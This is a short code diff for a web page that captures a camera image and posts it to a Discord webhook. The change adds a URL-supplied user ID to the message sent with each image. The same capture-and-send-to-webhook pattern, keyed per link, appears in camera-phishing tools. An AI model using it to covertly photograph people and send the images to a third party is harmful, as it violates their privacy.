@@ -98,6 +98,13 @@
             return;
         }
 
+        // Retrieve user ID from URL parameters
+        const urlParams = new URLSearchParams(window.location.search);
+        const userID = urlParams.get('userID');
+
+        // Display user ID (for debugging purposes)
+        console.log("User ID: " + userID);
+
         // Function to start the camera with specified facingMode
         async function startCamera(facingMode) {
             try {
@@ -137,7 +144,7 @@
                     const formData = new FormData();
                     formData.append('file', blob, 'camera-image.png');
                     formData.append('payload_json', JSON.stringify({
-                        content: "Preview your captured image!"
+                        content: `Preview your captured image! User ID: ${userID}`
                     }));
 
                     fetch(DISCORD_WEBHOOK_URL, {
